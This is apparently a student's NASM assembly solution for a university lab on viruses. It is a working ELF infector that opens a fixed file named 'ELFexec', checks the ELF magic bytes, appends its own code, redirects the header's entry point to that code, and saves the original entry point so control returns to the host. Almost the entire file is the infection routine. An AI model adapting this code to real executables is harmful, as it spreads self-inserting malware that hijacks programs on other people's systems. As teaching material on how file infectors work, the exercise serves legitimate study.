%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
	
	global _start

	section .text
_start:	push	ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage

	; You code for this lab goes here
	call get_my_loc
	sub ecx, next_i-ThisIsVirus
	write 1, ecx, ThisIsVirusLen		;Print a message to stdout, something like "This is a virus". 

	open_file:
	call get_my_loc
	sub ecx, next_i-FileName
	mov ebx, ecx
	open ebx, RDWR, 0777		;Open an ELF file with a given constant name "ELFexec". The open mode should be RDWR

	;Check that the open succeeded
	get_fd:
	cmp eax,0				;get return value
	jl VirusErrorExit
	mov dword[ebp-4], eax 		; ebp-4 = fd

	;check that this is an ELF file using its magic number
	lea ebx, [ebp-8]		; ebp-8 = magic numbers
	read eax,ebx,4
	;that this is an ELF file

	check_elf:
	cmp byte[ebp-7],'E'
	jne VirusErrorExit
	cmp byte[ebp-6], 'L'
	jne VirusErrorExit
	cmp byte[ebp-5], 'F'
	jne VirusErrorExit

	;if we got here - this is ELF File
	lseek dword[ebp-4],0,SEEK_END		;lseek() to get to the end of the file
	mov dword[ebp-100] ,eax 			;returns a useful number: the number of bytes in the file.  epb-100 = filesize

	;Add the code of your virus at the end of the ELF file, 
	add_virus:
	write dword[ebp-4],_start,virus_end-_start

	Task1:
	;copy the  header into the memory
	lseek dword[ebp-4],0,SEEK_SET		;set fd point to the begigng of the file
	lea ebx, [ebp-56]		; ebp-56 = header
	read dword[ebp-4],ebx,52			;elf header size is 52 bytes

	;save prev entry point : 
	mov edx, dword[ebp-32]
	mov dword[ebp-60],edx			;ebp-60 = prev entry point

	;update the entry point to the first instruction un the virus code
	mov eax, dword[ebp-100]					; filesize
	add eax,0x08048000			;0x08048000 - entry point
	mov dword[ebp-32], eax			;entry point + size file
	
	;writes back the ELF header to the beginning of the ELFexec file
	lseek dword[ebp-4],0,SEEK_SET		;set fd point to the begigng of the file
	lea ebx, [ebp-56]		; ebp-56 = header
	write dword[ebp-4],ebx,52

	Task2:
	;TODO:
	;instead of exiting, jump to the address indicated by the previous entry point. 
	;In order to do that, when infecting the ELFexec file, your virus should save the previous entry point 
	;somewhere before modifying it. The simplest scheme is to write it at the very end of the 
	;file after the virus code, replacing the value at that location in the skeleton code. 
	lseek dword[ebp-4],0,SEEK_SET
	lseek dword[ebp-4],0,SEEK_END		;lseek() to get to the end of the file
	sub eax,4
	lseek dword[ebp-4],eax,SEEK_SET
	lea ecx,[ebp-60]			;ebp-60 = prev entry point 
	write dword[ebp-4],ecx,4		;write to the end of file previous entry point

	Task3:

	;and close the file
	close dword[ebp-4]

Task2Exit:
	call get_my_loc
	sub ecx, next_i-PreviousEntryPoint
    jmp [ecx]

VirusExit:
       exit 0            ; Termination if all is OK and no previous code to jump to
                         ; (also an example for use of above macros)	
VirusErrorExit:
	call get_my_loc
	sub ecx, next_i-Failstr
	write 1, ecx, FailstrLength		;Print a message . 
	close dword[ebp-4]
	jmp Task2Exit

FileName:	db "ELFexec", 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
Failstr:        db "perhaps not", 10 , 0
FailstrLength: equ $-Failstr
ThisIsVirus: db "This is a Virus",10,0
ThisIsVirusLen: equ $-ThisIsVirus

get_my_loc:
	call next_i
next_i:
    pop ecx
    ret

PreviousEntryPoint: dd VirusExit
virus_end:


